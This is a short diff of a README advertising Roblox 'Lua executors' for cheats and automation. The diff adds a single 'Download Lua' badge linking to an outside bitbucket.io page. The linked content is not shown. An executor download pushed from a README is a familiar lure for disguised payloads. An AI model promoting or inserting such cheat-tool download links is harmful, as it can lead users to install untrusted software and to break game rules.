@@ -1,6 +1,7 @@
 # **🚀 Lua Executors: Top Tools for Roblox Scripting & Gameplay Dominance 🚀**  
 *Unlock cheats, automate tasks, and boost your Roblox experience with these powerful executors!*  
 
+[![Download Lua](https://img.shields.io/badge/Download-Lua-blueviolet)](https://robloxexecutors.bitbucket.io/executors/lua/)
 ---
 
 ### **🔥 Why Use a Lua Roblox Executor?**  
